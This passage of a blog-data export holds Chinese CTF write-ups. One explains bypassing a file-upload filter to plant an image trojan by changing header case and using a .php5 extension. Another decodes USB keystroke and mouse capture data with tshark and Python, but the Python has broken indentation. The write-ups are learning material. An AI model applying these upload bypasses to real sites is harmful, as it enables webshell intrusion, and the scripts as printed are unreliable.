alt=\"1.png\"></p>\n<p>分别对上述两处更改做一下解释：</p>\n<p>小写改为大写：类型检测大小写绕过</p>\n<p>当时做题的时候有两个地方不是很清楚，1、为什么要把小写改成大写。2、为什么会出现两个content-type，这两个又有什么区别</p>\n<ol>\n<li>后来经大佬提点，可能是服务器端验证，也就是代码校验，很多带waf的网站，在进行文件上传的时候。改了大小写以后就可以进去，有的时候会是content-type的multipart改为Multipart，有的时候是file改为File，还有把-改为+。这些都是与后台的代码有关。</li>\n<li>第二个问题解决的时候，查了很多的资料，但是最终都搞清楚了。</li>\n</ol>\n<p>简单来说，上面的就是在表单上传文件时的类型，下面的就是上传文件时的文件类型。</p>\n<p>具体的请参考：<a href=\"https://www.jianshu.com/p/29e38bcc8a1d\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/29e38bcc8a1d</a></p>\n<p>后缀名改为.php5</p>\n<p>利用过滤黑名单的方式防止上传。如果直接上传phtml，绕过黑名单，phtml还被能解析成php。符合的后缀包括 php、php3、php4、php5、phtml、pht等</p>\n<p>原理：在php5.conf文件中有相关php后缀的正则，只要符合该正则的php后缀，都可以被解析。</p>\n<p>另外附上PHP文件上传过程中基于白名单、黑名单、基于MIME的认证以及目录认证的代码样例：<a href=\"https://blog.csdn.net/hitwangpeng/article/details/47060671\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/hitwangpeng/article/details/47060671</a></p>\n<p>另，个人认为这是比较全的上传绕过的姿势了</p>\n<p><a href=\"https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/\" target=\"_blank\" rel=\"noopener\">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前做过的一个比较简单的文件上传，上传图片木马后，直接bp改包，利用%00截断改后缀就可以得到flag。</p>\n<p><a href=\"http://ctf5.shiyanbar.com/web/upload/\" target=\"_blank\" rel=\"noopener\">00截断题目</a></p>\n<p><a href=\"https://blog.csdn.net/wy_97/article/details/76549405\" target=\"_blank\" rel=\"noopener\">00截断wp</a></p>\n<p>今天遇到了一个需要绕过技巧的文件上传，所以，简单学习记录一下。</p>\n<p><a href=\"http://120.24.86.145:8002/web9/\" target=\"_blank\" rel=\"noopener\">题目来自于bugku</a></p>\n<p>解决思路：首先上传一个图片木马，bp抓包后，需要修改两处：</p>\n<p><img src=\"https://i.loli.net/2021/08/11/wmRnGVW6OId7uki.png\" alt=\"1.png\"></p>\n<p>分别对上述两处更改做一下解释：</p>\n<p>小写改为大写：类型检测大小写绕过</p>\n<p>当时做题的时候有两个地方不是很清楚，1、为什么要把小写改成大写。2、为什么会出现两个content-type，这两个又有什么区别</p>\n<ol>\n<li>后来经大佬提点，可能是服务器端验证，也就是代码校验，很多带waf的网站，在进行文件上传的时候。改了大小写以后就可以进去，有的时候会是content-type的multipart改为Multipart，有的时候是file改为File，还有把-改为+。这些都是与后台的代码有关。</li>\n<li>第二个问题解决的时候，查了很多的资料，但是最终都搞清楚了。</li>\n</ol>\n<p>简单来说，上面的就是在表单上传文件时的类型，下面的就是上传文件时的文件类型。</p>\n<p>具体的请参考：<a href=\"https://www.jianshu.com/p/29e38bcc8a1d\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/29e38bcc8a1d</a></p>\n<p>后缀名改为.php5</p>\n<p>利用过滤黑名单的方式防止上传。如果直接上传phtml，绕过黑名单，phtml还被能解析成php。符合的后缀包括 php、php3、php4、php5、phtml、pht等</p>\n<p>原理：在php5.conf文件中有相关php后缀的正则，只要符合该正则的php后缀，都可以被解析。</p>\n<p>另外附上PHP文件上传过程中基于白名单、黑名单、基于MIME的认证以及目录认证的代码样例：<a href=\"https://blog.csdn.net/hitwangpeng/article/details/47060671\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/hitwangpeng/article/details/47060671</a></p>\n<p>另，个人认为这是比较全的上传绕过的姿势了</p>\n<p><a href=\"https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/\" target=\"_blank\" rel=\"noopener\">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</a></p>\n"},{"title":"USB流量分析","date":"2018-11-18T16:00:00.000Z","_content":"\n## USB接口简介\n\n通过监听USB接口流量，可获取键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。\n\n## 题目\n\nwireshark打开数据包后发现为usb协议\n\n![1.png](https://i.loli.net/2021/08/11/TsacRxh9b1BOv2M.png)\n\nUSB协议数据部分在Leftover Capture Data域中，使用tshark命令将其单独提取出来\n\n``` shell\ntshark -r udn.pcapng -T fields -e usb.capdata > usbdata.txt\n```\n\ncat命令查看分离出的usbdata.txt\n\n``` shell\ncat usbdata.txt\n```\n\n![2.png](https://i.loli.net/2021/08/11/M6Fl4GaJ7A3yVuP.png)\n\n由于USB流量分为键盘流量和鼠标流量，而键盘数据包的数据长度为八个字节，鼠标数据包的数据长度为四个字节。\n\n键盘数据包击键信息集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet。\n\n鼠标数据包第一个字节代表按键，当取0×00时代表没有按键；当取0×01时代表按左键；当取0×02时代表当前按键为右键。第二个字节可看作为signed byte类型，其最高位为符号位，当值为正时，代表鼠标右移像素位；值为负时，代表鼠标左移像素位。第三个字节代表垂直上下移动的偏移。\n\n此题为键盘数据包\n\n```\n友情链接USB协议，查找值与具体键位的对应关系：\nhttp://www.usb.org/developers/hidpage/Hut1_12v2.pdf\n```\n\n根据第53页 usb keyboard映射表写脚本解码得出数据包\n\n![3.png](https://i.loli.net/2021/08/11/LQ9RZzuefENIcwT.png)\n\n上脚本\n\n``` python\nmappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\nnums = []\nkeys = open('usbdata.txt')\nfor line in keys:\nif line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':\n     continue\nnums.append(int(line[6:8],16))\nkeys.close()\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n    output += mappings[n]\nprint 'output :\\n' + output\n```\n\n![4.png](https://i.loli.net/2021/08/11/hGNXaxUEf5l6Pni.png)\n\n另附鼠标脚本\n\n``` python\nnums = [] \nkeys = open('data.txt','r') \nposx = 0 \nposy = 0 \nfor line in keys: \nif len(line) != 12 : \n     continue \nx = int(line[3:5],16) \ny = int(line[6:8],16) \nif x > 127 : \n    x -= 256 \nif y > 127 : \n    y -= 256 \nposx += x \nposy += y \nbtn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing \nif btn_flag == 1 : \n    print posx , posy \n    keys.close()\n```\n","source":"_posts/USB流量分析.md","raw":"---\ntitle: USB流量分析\ndate: 2018-11-19 00:00:00\ntags:\n- 原创\n- 流量分析\n---\n\n## USB接口简介\n\n通过监听USB接口流量，可获取键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。\n\n## 题目\n\nwireshark打开数据包后发现为usb协议\n\n![1.png](https://i.loli.net/2021/08/11/TsacRxh9b1BOv2M.png)\n\nUSB协议数据部分在Leftover Capture Data域中，使用tshark命令将其单独提取出来\n\n``` shell\ntshark -r udn.pcapng -T fields -e usb.capdata > usbdata.txt\n```\n\ncat命令查看分离出的usbdata.txt\n\n``` shell\ncat usbdata.txt\n```\n\n![2.png](https://i.loli.net/2021/08/11/M6Fl4GaJ7A3yVuP.png)\n\n由于USB流量分为键盘流量和鼠标流量，而键盘数据包的数据长度为八个字节，鼠标数据包的数据长度为四个字节。\n\n键盘数据包击键信息集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet。\n\n鼠标数据包第一个字节代表按键，当取0×00时代表没有按键；当取0×01时代表按左键；当取0×02时代表当前按键为右键。第二个字节可看作为signed byte类型，其最高位为符号位，当值为正时，代表鼠标右移像素位；值为负时，代表鼠标左移像素位。第三个字节代表垂直上下移动的偏移。\n\n此题为键盘数据包\n\n```\n友情链接USB协议，查找值与具体键位的对应关系：\nhttp://www.usb.org/developers/hidpage/Hut1_12v2.pdf\n```\n\n根据第53页 usb keyboard映射表写脚本解码得出数据包\n\n![3.png](https://i.loli.net/2021/08/11/LQ9RZzuefENIcwT.png)\n\n上脚本\n\n``` python\nmappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\nnums = []\nkeys = open('usbdata.txt')\nfor line in keys:\nif line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':\n     continue\nnums.append(int(line[6:8],16))\nkeys.close()\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n    output += mappings[n]\nprint 'output :\\n' + output\n```\n\n![4.png](https://i.loli.net/2021/08/11/hGNXaxUEf5l6Pni.png)\n\n另附鼠标脚本\n\n``` python\nnums = [] \nkeys = open('data.txt','r') \nposx = 0 \nposy = 0 \nfor line in keys: \nif len(line) != 12 : \n     continue \nx = int(line[3:5],16) \ny = int(line[6:8],16) \nif x > 127 : \n    x -= 256 \nif y > 127 : \n    y -= 256 \nposx += x \nposy += y \nbtn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing \nif btn_flag == 1 : \n    print posx , posy \n    keys.close()\n```\n","slug":"USB流量分析","published":1,"updated":"2022-04-29T10:22:34.992Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl2n8fso600015l9j2lh95kra","content":"<h2 id=\"USB接口简介\"><a href=\"#USB接口简介\" class=\"headerlink\" title=\"USB接口简介\"></a>USB接口简介</h2><p>通过监听USB接口流量，可获取键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。</p>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>wireshark打开数据包后发现为usb协议</p>\n<p><img src=\"https://i.loli.net/2021/08/11/TsacRxh9b1BOv2M.png\" alt=\"1.png\"></p>\n<p>USB协议数据部分在Leftover Capture Data域中，使用tshark命令将其单独提取出来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r udn.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>\n\n<p>cat命令查看分离出的usbdata.txt</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat usbdata.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/08/11/M6Fl4GaJ7A3yVuP.png\" alt=\"2.png\"></p>\n<p>由于USB流量分为键盘流量和鼠标流量，而键盘数据包的数据长度为八个字节，鼠标数据包的数据长度为四个字节。</p>\n<p>键盘数据包击键信息集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet。</p>\n<p>鼠标数据包第一个字节代表按键，当取0×00时代表没有按键；当取0×01时代表按左键；当取0×02时代表当前按键为右键。第二个字节可看作为signed byte类型，其最高位为符号位，当值为正时，代表鼠标右移像素位；值为负时，代表鼠标左移像素位。第三个字节代表垂直上下移动的偏移。</p>\n<p>此题为键盘数据包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">友情链接USB协议，查找值与具体键位的对应关系：</span><br><span class=\"line\">http:&#x2F;&#x2F;www.usb.org&#x2F;developers&#x2F;hidpage&#x2F;Hut1_12v2.pdf</span><br></pre></td></tr></table></figure>\n\n<p>根据第53页 usb keyboard映射表写脚本解码得出数据包</p>\n<p><img src=\"https://i.loli.net/2021/08/11/LQ9RZzuefENIcwT.png\" alt=\"3.png\"></p>\n<p>上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mappings = &#123; <span class=\"number\">0x04</span>:<span class=\"string\">\"A\"</span>,  <span class=\"number\">0x05</span>:<span class=\"string\">\"B\"</span>,  <span class=\"number\">0x06</span>:<span class=\"string\">\"C\"</span>, <span class=\"number\">0x07</span>:<span class=\"string\">\"D\"</span>, <span class=\"number\">0x08</span>:<span class=\"string\">\"E\"</span>, <span class=\"number\">0x09</span>:<span class=\"string\">\"F\"</span>, <span class=\"number\">0x0A</span>:<span class=\"string\">\"G\"</span>,  <span class=\"number\">0x0B</span>:<span class=\"string\">\"H\"</span>, <span class=\"number\">0x0C</span>:<span class=\"string\">\"I\"</span>,  <span class=\"number\">0x0D</span>:<span class=\"string\">\"J\"</span>, <span class=\"number\">0x0E</span>:<span class=\"string\">\"K\"</span>, <span class=\"number\">0x0F</span>:<span class=\"string\">\"L\"</span>, <span class=\"number\">0x10</span>:<span class=\"string\">\"M\"</span>, <span class=\"number\">0x11</span>:<span class=\"string\">\"N\"</span>,<span class=\"number\">0x12</span>:<span class=\"string\">\"O\"</span>,  <span class=\"number\">0x13</span>:<span class=\"string\">\"P\"</span>, <span class=\"number\">0x14</span>:<span class=\"string\">\"Q\"</span>, <span class=\"number\">0x15</span>:<span class=\"string\">\"R\"</span>, <span class=\"number\">0x16</span>:<span class=\"string\">\"S\"</span>, <span class=\"number\">0x17</span>:<span class=\"string\">\"T\"</span>, <span class=\"number\">0x18</span>:<span class=\"string\">\"U\"</span>,<span class=\"number\">0x19</span>:<span class=\"string\">\"V\"</span>, <span class=\"number\">0x1A</span>:<span class=\"string\">\"W\"</span>, <span class=\"number\">0x1B</span>:<span class=\"string\">\"X\"</span>, <span class=\"number\">0x1C</span>:<span class=\"string\">\"Y\"</span>, <span class=\"number\">0x1D</span>:<span class=\"string\">\"Z\"</span>, <span class=\"number\">0x1E</span>:<span class=\"string\">\"1\"</span>, <span class=\"number\">0x1F</span>:<span class=\"string\">\"2\"</span>, <span class=\"number\">0x20</span>:<span class=\"string\">\"3\"</span>, <span class=\"number\">0x21</span>:<span class=\"string\">\"4\"</span>, <span class=\"number\">0x22</span>:<span class=\"string\">\"5\"</span>,  <span class=\"number\">0x23</span>:<span class=\"string\">\"6\"</span>, <span class=\"number\">0x24</span>:<span class=\"string\">\"7\"</span>, <span class=\"number\">0x25</span>:<span class=\"string\">\"8\"</span>, <span class=\"number\">0x26</span>:<span class=\"string\">\"9\"</span>, <span class=\"number\">0x27</span>:<span class=\"string\">\"0\"</span>, <span class=\"number\">0x28</span>:<span class=\"string\">\"\\n\"</span>, <span class=\"number\">0x2a</span>:<span class=\"string\">\"[DEL]\"</span>,  <span class=\"number\">0X2B</span>:<span class=\"string\">\"    \"</span>, <span class=\"number\">0x2C</span>:<span class=\"string\">\" \"</span>,  <span class=\"number\">0x2D</span>:<span class=\"string\">\"-\"</span>, <span class=\"number\">0x2E</span>:<span class=\"string\">\"=\"</span>, <span class=\"number\">0x2F</span>:<span class=\"string\">\"[\"</span>,  <span class=\"number\">0x30</span>:<span class=\"string\">\"]\"</span>,  <span class=\"number\">0x31</span>:<span class=\"string\">\"\\\\\"</span>, <span class=\"number\">0x32</span>:<span class=\"string\">\"~\"</span>, <span class=\"number\">0x33</span>:<span class=\"string\">\";\"</span>,  <span class=\"number\">0x34</span>:<span class=\"string\">\"'\"</span>, <span class=\"number\">0x36</span>:<span class=\"string\">\",\"</span>,  <span class=\"number\">0x37</span>:<span class=\"string\">\".\"</span> &#125;</span><br><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(<span class=\"string\">'usbdata.txt'</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\"><span class=\"keyword\">if</span> line[<span class=\"number\">0</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">1</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">3</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">4</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">9</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">10</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">12</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">13</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">15</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">16</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">18</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">19</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">21</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">22</span>]!=<span class=\"string\">'0'</span>:</span><br><span class=\"line\">     <span class=\"keyword\">continue</span></span><br><span class=\"line\">nums.append(int(line[<span class=\"number\">6</span>:<span class=\"number\">8</span>],<span class=\"number\">16</span>))</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\">output = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> nums:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n == <span class=\"number\">0</span> :</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n <span class=\"keyword\">in</span> mappings:</span><br><span class=\"line\">    output += mappings[n]</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'output :\\n'</span> + output</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/08/11/hGNXaxUEf5l6Pni.png\" alt=\"4.png\"></p>\n<p>另附鼠标脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums = [] </span><br><span class=\"line\">keys = open(<span class=\"string\">'data.txt'</span>,<span class=\"string\">'r'</span>) </span><br><span class=\"line\">posx = <span class=\"number\">0</span> </span><br><span class=\"line\">posy = <span class=\"number\">0</span> </span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> keys: </span><br><span class=\"line\"><span class=\"keyword\">if</span> len(line) != <span class=\"number\">12</span> : </span><br><span class=\"line\">     <span class=\"keyword\">continue</span> </span><br><span class=\"line\">x = int(line[<span class=\"number\">3</span>:<span class=\"number\">5</span>],<span class=\"number\">16</span>) </span><br><span class=\"line\">y = int(line[<span class=\"number\">6</span>:<span class=\"number\">8</span>],<span class=\"number\">16</span>) </span><br><span class=\"line\"><span class=\"keyword\">if</span> x &gt; <span class=\"number\">127</span> : </span><br><span class=\"line\">    x -= <span class=\"number\">256</span> </span><br><span class=\"line\"><span class=\"keyword\">if</span> y &gt; <span class=\"number\">127</span> : </span><br><span class=\"line\">    y -= <span class=\"number\">256</span> </span><br><span class=\"line\">posx += x </span><br><span class=\"line\">posy += y </span><br><span class=\"line\">btn_flag = int(line[<span class=\"number\">0</span>:<span class=\"number\">2</span>],<span class=\"number\">16</span>)  <span class=\"comment\"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> btn_flag == <span class=\"number\">1</span> : </span><br><span class=\"line\">    <span class=\"keyword\">print</span> posx , posy </span><br><span class=\"line\">    keys.close()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"USB接口简介\"><a href=\"#USB接口简介\" class=\"headerlink\" title=\"USB接口简介\"></a>USB接口简介</h2><p>通过监听USB接口流量，可获取键盘击键，鼠标移动与点击，存储设备的明文传输通信，USB无线网卡网络传输内容等。</p>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>wireshark打开数据包后发现为usb协议</p>\n<p><img src=\"https://i.loli.net/2021/08/11/TsacRxh9b1BOv2M.png\" alt=\"1.png\"></p>\n<p>USB协议数据部分在Leftover Capture Data域中，使用tshark命令将其单独提取出来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r udn.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>\n\n<p>cat命令查看分离出的usbdata.txt</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat usbdata.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/08/11/M6Fl4GaJ7A3yVuP.png\" alt=\"2.png\"></p>\n<p>由于USB流量分为键盘流量和鼠标流量，而键盘数据包的数据长度为八个字节，鼠标数据包的数据长度为四个字节。</p>\n<p>键盘数据包击键信息集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet。</p>\n<p>鼠标数据包第一个字节代表按键，当取0×00时代表没有按键；当取0×01时代表按左键；当取0×02时代表当前按键为右键。第二个字节可看作为signed byte类型，其最高位为符号位，当值为正时，代表鼠标右移像素位；值为负时，代表鼠标左移像素位。第三个字节代表垂直上下移动的偏移。</p>\n<p>此题为键盘数据包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">友情链接USB协议，查找值与具体键位的对应关系：</span><br><span class=\"line\">http:&#x2F;&#x2F;www.usb.org&#x2F;developers&#x2F;hidpage&#x2F;Hut1_12v2.pdf</span><br></pre></td></tr></table></figure>\n\n<p>根据第53页 usb keyboard映射表写脚本解码得出数据包</p>\n<p><img src=\"https://i.loli.net/2021/08/11/LQ9RZzuefENIcwT.png\" alt=\"3.png\"></p>\n<p>上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mappings = &#123; <span class=\"number\">0x04</span>:<span class=\"string\">\"A\"</span>,  <span class=\"number\">0x05</span>:<span class=\"string\">\"B\"</span>,  <span class=\"number\">0x06</span>:<span class=\"string\">\"C\"</span>, <span class=\"number\">0x07</span>:<span class=\"string\">\"D\"</span>, <span class=\"number\">0x08</span>:<span class=\"string\">\"E\"</span>, <span class=\"number\">0x09</span>:<span class=\"string\">\"F\"</span>, <span class=\"number\">0x0A</span>:<span class=\"string\">\"G\"</span>,  <span class=\"number\">0x0B</span>:<span class=\"string\">\"H\"</span>, <span class=\"number\">0x0C</span>:<span class=\"string\">\"I\"</span>,  <span class=\"number\">0x0D</span>:<span class=\"string\">\"J\"</span>, <span class=\"number\">0x0E</span>:<span class=\"string\">\"K\"</span>, <span class=\"number\">0x0F</span>:<span class=\"string\">\"L\"</span>, <span class=\"number\">0x10</span>:<span class=\"string\">\"M\"</span>, <span class=\"number\">0x11</span>:<span class=\"string\">\"N\"</span>,<span class=\"number\">0x12</span>:<span class=\"string\">\"O\"</span>,  <span class=\"number\">0x13</span>:<span class=\"string\">\"P\"</span>, <span class=\"number\">0x14</span>:<span class=\"string\">\"Q\"</span>, <span class=\"number\">0x15</span>:<span class=\"string\">\"R\"</span>, <span class=\"number\">0x16</span>:<span class=\"string\">\"S\"</span>, <span class=\"number\">0x17</span>:<span class=\"string\">\"T\"</span>, <span class=\"number\">0x18</span>:<span class=\"string\">\"U\"</span>,<span class=\"number\">0x19</span>:<span class=\"string\">\"V\"</span>, <span class=\"number\">0x1A</span>:<span class=\"string\">\"W\"</span>, <span class=\"number\">0x1B</span>:<span class=\"string\">\"X\"</span>, <span class=\"number\">0x1C</span>:<span class=\"string\">\"Y\"</span>, <span class=\"number\">0x1D</span>:<span class=\"string\">\"Z\"</span>, <span class=\"number\">0x1E</span>:<span class=\"string\">\"1\"</span>, <span class=\"number\">0x1F</span>:<span class=\"string\">\"2\"</span>, <span class=\"number\">0x20</span>:<span class=\"string\">\"3\"</span>, <span class=\"number\">0x21</span>:<span class=\"string\">\"4\"</span>, <span class=\"number\">0x22</span>:<span class=\"string\">\"5\"</span>,  <span class=\"number\">0x23</span>:<span class=\"string\">\"6\"</span>, <span class=\"number\">0x24</span>:<span class=\"string\">\"7\"</span>, <span class=\"number\">0x25</span>:<span class=\"string\">\"8\"</span>, <span class=\"number\">0x26</span>:<span class=\"string\">\"9\"</span>, <span class=\"number\">0x27</span>:<span class=\"string\">\"0\"</span>, <span class=\"number\">0x28</span>:<span class=\"string\">\"\\n\"</span>, <span class=\"number\">0x2a</span>:<span class=\"string\">\"[DEL]\"</span>,  <span class=\"number\">0X2B</span>:<span class=\"string\">\"    \"</span>, <span class=\"number\">0x2C</span>:<span class=\"string\">\" \"</span>,  <span class=\"number\">0x2D</span>:<span class=\"string\">\"-\"</span>, <span class=\"number\">0x2E</span>:<span class=\"string\">\"=\"</span>, <span class=\"number\">0x2F</span>:<span class=\"string\">\"[\"</span>,  <span class=\"number\">0x30</span>:<span class=\"string\">\"]\"</span>,  <span class=\"number\">0x31</span>:<span class=\"string\">\"\\\\\"</span>, <span class=\"number\">0x32</span>:<span class=\"string\">\"~\"</span>, <span class=\"number\">0x33</span>:<span class=\"string\">\";\"</span>,  <span class=\"number\">0x34</span>:<span class=\"string\">\"'\"</span>, <span class=\"number\">0x36</span>:<span class=\"string\">\",\"</span>,  <span class=\"number\">0x37</span>:<span class=\"string\">\".\"</span> &#125;</span><br><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(<span class=\"string\">'usbdata.txt'</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\"><span 